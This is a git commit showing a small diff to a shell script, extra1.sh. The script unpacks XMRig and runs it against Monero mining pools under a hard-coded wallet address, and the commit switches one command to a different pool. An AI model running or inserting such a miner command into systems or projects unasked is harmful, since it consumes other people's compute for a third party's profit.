880ccb4b54cfc32900ced625112453d650d530af
dragonmhmh <82892187+dragonmhmh@users.noreply.github.com>
2021-05-21 15:15:15 +0100

    Update extra1.sh

--- extra1.sh
+++ extra1.sh
@@ -1,3 +1,3 @@
 tar xvzf xmrig-v6.12.1-C3-linux-Static.tar.gz
 ./xmrig -o mine.c3pool.com:23333 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv+128000 -p x
-./xmrig -o mine.c3pool.com:23333 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv+128000 -k --tls
+./xmrig -o pool.supportxmr.com:7777 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -k --tls
